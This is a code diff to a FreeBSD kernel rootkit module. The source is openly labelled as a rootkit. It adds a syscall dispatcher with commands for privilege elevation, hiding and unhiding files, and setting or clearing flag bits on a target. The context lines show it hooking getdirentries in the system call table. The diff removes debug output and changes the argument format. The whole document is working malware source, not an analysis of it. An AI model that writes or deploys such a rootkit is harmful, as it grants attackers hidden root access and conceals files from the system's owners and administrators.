@@ -1,27 +1,11 @@
-#include <sys/types.h>
-#include <sys/param.h>
-#include <sys/proc.h>
-#include <sys/module.h>
-#include <sys/sysent.h>
-#include <sys/kernel.h>
-#include <sys/systm.h>
-#include <sys/sysproto.h>
-#include <sys/syscall.h>
-#include <sys/param.h>
-#include <sys/linker.h>
-
-#include <sys/proc.h>
-#include <sys/resourcevar.h>
-#include <sys/mutex.h>
-#include <sys/lock.h>
-#include <sys/sx.h>
-
 #include "rootkit.h"
+
+struct node * first_node = NULL;
 
 /* The system call's arguments. */
 struct rootkit_args {
 	int command;
-	char * args; 
+	char ** args;
 };
 
 /* The system call function. */
@@ -29,7 +13,9 @@ static int main(struct thread *td, void *syscall_args) {
 
 	struct rootkit_args *uap;
 	uap = (struct rootkit_args *)syscall_args;
-	uprintf("uap command: %d\nuap args: %s\n", uap->command, uap->args);
+
+	long resp;
+
 	switch(uap->command){
 		case 0:// Unload
 			break;
@@ -37,12 +23,18 @@ static int main(struct thread *td, void *syscall_args) {
 			elevate(td);
 			break;
 		case 2:// File hide
-			uprintf("Adding: %s\n", uap->args);
-			add_file(uap->args);
+			add_file(uap->args[0]);
 			break;
 		case 3:
-			uprintf("Removing %s\n", uap->args);
-			remove_file(uap->args);
+			remove_file(uap->args[0]);
+			break;
+		case 4:
+			resp = strtol(uap->args[1], NULL, 10);
+			set_flag_bits(uap->args[0], (uint8_t)resp);
+			break;
+		case 5:
+			resp = strtol(uap->args[1], NULL, 10);
+			unset_flag_bits(uap->args[0], (uint8_t)resp);
 			break;
 		default:
 			uprintf("Bad command\n");
@@ -73,8 +65,8 @@ static int load(struct module *module, int cmd, void *arg) {
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries_hook;
 		printf("getdirentries hooked\n");
 
-		
-		
+
+
 		break;
 
 	case MOD_UNLOAD:
